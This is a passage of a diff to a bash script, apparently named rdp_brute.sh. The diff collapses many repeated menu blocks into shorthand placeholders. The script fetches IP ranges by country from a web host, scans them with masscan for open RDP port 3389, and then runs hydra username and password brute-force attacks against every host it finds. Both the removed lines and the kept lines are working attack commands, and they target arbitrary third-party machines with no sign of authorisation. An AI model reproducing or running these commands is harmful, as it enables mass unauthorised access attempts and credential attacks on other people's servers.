-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25918,6 +10382,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -25927,53 +10392,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -25991,6 +10410,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26000,53 +10420,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26064,6 +10438,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26073,53 +10448,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "142" ]; then
 curl http://ipdiapazon.16mb.com/Pakistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -26135,6 +10464,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26144,53 +10474,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26208,6 +10492,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26217,53 +10502,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "144" ]; then
@@ -26280,6 +10519,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26289,53 +10529,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26353,6 +10547,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26362,53 +10557,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26426,6 +10575,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26435,53 +10585,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26499,6 +10603,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26508,53 +10613,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26572,6 +10631,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26581,53 +10641,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26645,6 +10659,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26654,53 +10669,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26718,6 +10687,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26727,53 +10697,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26791,6 +10715,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26800,53 +10725,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26864,6 +10743,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26873,53 +10753,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
